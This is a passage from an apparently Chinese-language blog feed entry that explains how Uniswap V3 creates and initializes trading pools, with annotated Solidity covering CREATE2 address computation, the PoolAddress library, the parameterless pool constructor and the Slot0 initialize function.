class="hljs-variable">salt</span> + <span class="hljs-title">keccak256</span>(<span class="hljs-variable">init_code</span>))</span><br></code></pre></td></tr></table></figure><p>函数deploy中使用CREATE2来创建合约</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pool</span> = address(new UniswapV<span class="hljs-number">3</span>Pool&#123;salt: keccak<span class="hljs-number">256</span>(abi.encode(token<span class="hljs-number">0</span>, token<span class="hljs-number">1</span>, fee))&#125;());<br></code></pre></td></tr></table></figure><p>优点</p><ul><li><p>可以在链下计算出已经创建的交易池的地址</p></li><li><p>其他合约不必通过 UniswapV3Factory 中的接口来查询交易池的地址，可以节省 gas</p></li><li><p>合约地址不会因为reorg （区块重组、分叉） 而改变</p></li><li><p>如果一个合约自毁了，那么新合约未来可以再次部署到这个地址上</p></li><li><p>在未部署前可以提前获取合约地址</p></li></ul><p>可以依据bytecode计算合约地址，例如在library PoolAddress中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @title Provides functions for deriving a pool address from the factory, tokens, and the fee<br>library PoolAddress &#123;<br>    bytes32 internal constant POOL_INIT_CODE_HASH = 0xe34f199b19b2b4f47f68442619d555527d244f78a3297ea89325f843f87b8b54;<br><br>    /// @notice The identifying key of the pool<br>    struct PoolKey &#123;<br>        address token0;<br>        address token1;<br>        uint24 fee;<br>    &#125;<br><br>...<br><br>    /// @notice Deterministically computes the pool address given the factory and PoolKey<br>    /// @param factory The Uniswap V3 factory contract address<br>    /// @param key The PoolKey<br>    /// @return pool The contract address of the V3 pool<br>    function computeAddress(address factory, PoolKey memory key) internal pure returns (address pool) &#123;<br>        require(key.token0 &lt; key.token1);<br>        pool = address(<br>            uint256(<br>                keccak256(<br>                    abi.encodePacked(<br>                        hex&#x27;ff&#x27;,<br>                        factory,<br>                        keccak256(abi.encode(key.token0, key.token1, key.fee)),<br>                        POOL_INIT_CODE_HASH<br>                    )<br>                )<br>            )<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>新交易对合约的构造函数中会反向查询 <code>UniswapV3Factory</code> 中的 parameters 值来进行初始变量的赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Pool is IUniswapV3Pool, NoDelegateCall &#123;<br>...<br>constructor() &#123;<br>    int24 _tickSpacing;<br>    (factory, token0, token1, fee, _tickSpacing) = IUniswapV3PoolDeployer(msg.sender).parameters();<br>    tickSpacing = _tickSpacing;<br><br>    maxLiquidityPerTick = Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么不直接使用参数传递来对新合约的状态变量赋值呢。这是因为 <code>CREATE2</code> 会将合约的 <code>initcode</code> 和 <code>salt</code> 一起用来计算创建出的合约地址。而 <code>initcode</code> 是包含 <code>contructor</code> code 和其参数的，如果合约的 <code>constructor</code> 函数包含了参数，那么其 <code>initcode</code> 将因为其传入参数不同而不同。在 off-chain 计算合约地址时，也需要通过这些参数来查询对应的 <code>initcode</code>。为了让合约地址的计算更简单，这里的 <code>constructor</code> 不包含参数（这样合约的 <code>initcode</code> 将时唯一的），而是使用动态 call 的方式来获取其创建参数。</p><h2 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h2><p>在合约UniswapV3Pool中，对创建的交易对合约进行初始化。所有交易池的参数和状态用一个数据结构Slot0来记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">    struct Slot0 &#123;<br>        // the current price<br>        uint160 sqrtPriceX96;<br>        // the current tick<br>        int24 tick;<br>        // the most-recently updated index of the observations array<br>        uint16 observationIndex;<br>        // the current maximum number of observations that are being stored<br>        uint16 observationCardinality;<br>        // the next maximum number of observations to store, triggered in observations.write<br>        uint16 observationCardinalityNext;<br>        // the current protocol fee as a percentage of the swap fee taken on withdrawal<br>        // represented as an integer denominator (1/x)%<br>        uint8 feeProtocol;<br>        // whether the pool is locked<br>        bool unlocked;<br>    &#125;<br>    /// @inheritdoc IUniswapV3PoolState<br>    Slot0 public override slot0;<br><br>/// @inheritdoc IUniswapV3PoolActions<br>    /// @dev not locked because it initializes unlocked<br>    //这里的sqrtPriceX96为sqrt(amountToken1/amountToken0)Q64.96精度的定点数值<br>    function initialize(uint160 sqrtPriceX96) external override &#123;<br>        //检查池子价格是否未初始化<br>        require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);<br><br>        //计算最大的tick<br>        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);<br><br>        //获取cardinality(基数)与cardinalityNext(下一个基数)的数值<br>        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());<br><br>        //对slot0进行初始化操作<br>        slot0 = Slot0(&#123;<br>            sqrtPriceX96: sqrtPriceX96,<br>            tick: tick,<br>            observationIndex: 0,<br>            observationCardinality: cardinality,<br>            observationCardinalityNext: cardinalityNext,<br>            feeProtocol: 0,<br>            unlocked: true<br>        &#125;);<br><br>        emit Initialize(sqrtPriceX96, tick);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>初始化主要是设置了交易池的初始价格（注意，此时池子中还没有流动性），以及费率，tick 等相关变量的初始化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;创建交易对&quot;&gt;&lt;a href=&quot;#创建交易对&quot; class=&quot;headerlink&quot; title=&quot;创建交易对&quot;&gt;&lt;/a&gt;创建交易对&lt;/h1&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
</feed>
